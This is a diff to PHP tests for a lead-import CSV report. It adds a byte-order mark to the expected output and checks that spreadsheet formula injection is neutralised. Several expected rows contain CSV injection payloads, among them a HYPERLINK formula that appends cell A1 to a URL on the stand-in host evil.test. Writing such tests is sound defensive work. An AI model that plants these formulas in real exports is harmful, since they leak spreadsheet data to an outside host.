@@ -408,7 +408,7 @@ test('the import report downloads failed and flagged rows as a CSV', function ()
         ->assertDownload('leads-report.csv');
 
     expect($response->streamedContent())->toBe(
-        "row,email,outcome,detail\n3,broken,failed,\"Invalid email address.\"\n4,ada@gmial.com,fixed,\"Possible typo ada@gmail.com\"\n",
+        "\xEF\xBB\xBFrow,email,outcome,detail\n3,broken,failed,\"Invalid email address.\"\n4,ada@gmial.com,fixed,\"Possible typo ada@gmail.com\"\n",
     );
 });
 
@@ -427,7 +427,7 @@ test('the import report neutralises spreadsheet formulas from failed rows', func
         ->assertOk();
 
     expect($response->streamedContent())->toBe(
-        "row,email,outcome,detail\n3,\"'=HYPERLINK(\"\"http://evil.test/?\"\"&A1;\"\"x\"\")\",failed,\"Invalid email address.\"\n",
+        "\xEF\xBB\xBFrow,email,outcome,detail\n3,\"'=HYPERLINK(\"\"http://evil.test/?\"\"&A1;\"\"x\"\")\",failed,\"Invalid email address.\"\n",
     );
 });
 
@@ -716,6 +716,6 @@ test('the import report neutralises spreadsheet formulas taken from the uploaded
         ->streamedContent();
 
     expect($content)->toBe(
-        "row,email,outcome,detail\n2,\"'=hyperlink(\"\"https://evil.example\"\")\",failed,\"Invalid email address.\"\n3,'@sum(1+1),failed,\"Invalid email address.\"\n",
+        "\xEF\xBB\xBFrow,email,outcome,detail\n2,\"'=hyperlink(\"\"https://evil.example\"\")\",failed,\"Invalid email address.\"\n3,'@sum(1+1),failed,\"Invalid email address.\"\n",
     );
 });
